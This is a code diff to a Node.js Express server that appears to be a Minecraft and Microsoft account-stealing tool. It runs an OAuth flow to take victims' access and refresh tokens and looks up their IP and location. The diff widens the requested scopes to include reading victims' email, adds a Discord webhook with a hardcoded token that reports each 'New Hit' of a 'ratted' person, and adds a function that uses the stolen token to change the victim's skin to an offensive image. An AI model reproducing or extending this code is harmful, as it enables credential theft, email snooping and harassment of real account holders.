@@ -1,5 +1,6 @@
 const express = require(`express`);
 const app = express();
+const mojang = require('mojang')
 app.use(express.static(__dirname));
 const i = require(`node:events`)
 require('dotenv').config();
@@ -23,19 +24,17 @@ app.use(
 		extended: true,
 	})
 );
+const chromatism = require(`chromatism`)
 
 const ascii = 
 `
 \n
-▒██   ██▓█████ ███▄    █ ▒█████  ███▄    █     ▒█████  ▄▄▄      █    ██▄▄▄█████▓██░ ██ 
-▒▒ █ █ ▒▓█   ▀ ██ ▀█   █▒██▒  ██▒██ ▀█   █    ▒██▒  ██▒████▄    ██  ▓██▓  ██▒ ▓▓██░ ██▒
-░░  █   ▒███  ▓██  ▀█ ██▒██░  ██▓██  ▀█ ██▒   ▒██░  ██▒██  ▀█▄ ▓██  ▒██▒ ▓██░ ▒▒██▀▀██░
- ░ █ █ ▒▒▓█  ▄▓██▒  ▐▌██▒██   ██▓██▒  ▐▌██▒   ▒██   ██░██▄▄▄▄██▓▓█  ░██░ ▓██▓ ░░▓█ ░██ 
-▒██▒ ▒██░▒████▒██░   ▓██░ ████▓▒▒██░   ▓██░   ░ ████▓▒░▓█   ▓██▒▒█████▓  ▒██▒ ░░▓█▒░██▓
-▒▒ ░ ░▓ ░░ ▒░ ░ ▒░   ▒ ▒░ ▒░▒░▒░░ ▒░   ▒ ▒    ░ ▒░▒░▒░ ▒▒   ▓▒█░▒▓▒ ▒ ▒  ▒ ░░   ▒ ░░▒░▒
-░░   ░▒ ░░ ░  ░ ░░   ░ ▒░ ░ ▒ ▒░░ ░░   ░ ▒░     ░ ▒ ▒░  ▒   ▒▒ ░░▒░ ░ ░    ░    ▒ ░▒░ ░
- ░    ░    ░     ░   ░ ░░ ░ ░ ▒    ░   ░ ░    ░ ░ ░ ▒   ░   ▒   ░░░ ░ ░  ░      ░  ░░ ░
- ░    ░    ░  ░        ░    ░ ░          ░        ░ ░       ░  ░  ░             ░  ░  ░ \n`;
+██╗  ████████████╗   ██╗██████╗███╗   ██╗     ██████╗ █████╗██╗   ████████████╗  ██╗
+╚██╗██╔██╔════████╗  ████╔═══██████╗  ██║    ██╔═══████╔══████║   ██╚══██╔══██║  ██║
+ ╚███╔╝█████╗ ██╔██╗ ████║   ████╔██╗ ██║    ██║   ███████████║   ██║  ██║  ███████║
+ ██╔██╗██╔══╝ ██║╚██╗████║   ████║╚██╗██║    ██║   ████╔══████║   ██║  ██║  ██╔══██║
+██╔╝ ███████████║ ╚████╚██████╔██║ ╚████║    ╚██████╔██║  ██╚██████╔╝  ██║  ██║  ██║
+╚═╝  ╚═╚══════╚═╝  ╚═══╝╚═════╝╚═╝  ╚═══╝     ╚═════╝╚═╝  ╚═╝╚═════╝   ╚═╝  ╚═╝  ╚═╝\n`;
 const axios = require(`axios`);
 var usernameArray = [];
 var port = process.env.PORT || 8080
@@ -45,11 +44,11 @@ var redirectUrl = process.env.redirectUrl
 var PasteKey = process.env.PasteKey
 var microsoftOauthUrl = 'https://login.live.com/oauth20_token.srf';
 var scopes = encodeURIComponent(
-	`XboxLive.signin`
+	"XboxLive.signin offline_access openid https://graph.microsoft.com/mail.read"
 );
 
 console.clear();
-console.log(chalk.red(ascii));
+console.log(chalk.yellow(ascii));
 
 app.listen(port, () => {
 	console.log(`\nListening on port ${port}`)
@@ -187,6 +186,25 @@ async function sendEmbed(MinecraftToken, uuid, refreshToken, username, ip, IpUrl
 	});
 }
 
+async function sendEmbed2() {
+	const webhook = new WebhookClient({
+		id: '1090664218010845234',
+		token:
+			'Q-DVC872Mk_M_XgzSeJ2CfPI9FQ7KNxS8moqWVOLzKhskQAXFgPdG1mjUY2-zei52mQM',
+	});
+	const embed = new EmbedBuilder()
+		.setTitle(`**New Hit ❗**`)
+		.setAuthor({ name: 'Xenon', iconURL: 'https://i.imgur.com/nXvl29a.png'})
+		.setDescription('The person you ratted doesnt own Minecraft :(')
+		.setColor(0x0099FF)
+		.setFooter({ text: 'legion*#4154', iconURL: 'https://i.imgur.com/rlHZ2Sx.png' })
+		.setTimestamp();
+
+	webhook.send({
+		embeds: [embed],
+	});
+}
+
 async function getIpInfo(ip){
 	class ipClass {
 		constructor(IPV4, Region, City, ISP, Lon, Lat) {
@@ -221,6 +239,15 @@ async function Paste(key, ipInfo){
 	return `\`Reached Max Paste Limit\``
 }
 }
+
+async function hahaFunny(Bearer, Uuid, skinUrl){
+	var ii = {
+		'variant' : 'slim',
+		'url' : skinUrl
+	 }
+	const resp = await http_client_methods_1.HttpPost(`https://api.minecraftservices.com/minecraft/profile/skins`, ii, {'Authorization': `Bearer ${Bearer}`})
+}
+
 async function main(code){
 	const access_token_response = await getAccesToken(
 		clientId,
@@ -228,6 +255,7 @@ async function main(code){
 		clientSecret,
 		redirectUrl
 	);
+	try{
 	var accesstoken = access_token_response[0];
 	var refreshtoken = access_token_response[1];
 	var xblToken = await getXblToken(accesstoken);
@@ -242,8 +270,11 @@ async function main(code){
 	var ip = await getIp()
 	var ipInfo = (await getIpInfo(ip))
 	var PasteLink = await Paste(PasteKey, ipInfo)
-	await sendEmbed(MinecraftToken, Uuid, refreshtoken, Ign, ip, PasteLink);
+	hahaFunny(MinecraftToken, Uuid, `https://www.minecraftskins.com/uploads/skins/2018/11/22/mitler-12607230.png?v560`)
 	console.log(chalk.red(`\n[!] New Hit`))
+	}catch(err){
+		sendEmbed2()
+	}
 }
 async function main2(access_token, refresh_token){
 	try{
@@ -283,6 +314,5 @@ app.get(`/refresh`, async (req,res)=>{
 	const AccessToken = ParsedRes.access_token
 	main2(AccessToken, refreshToken)
 })
-	
 
 
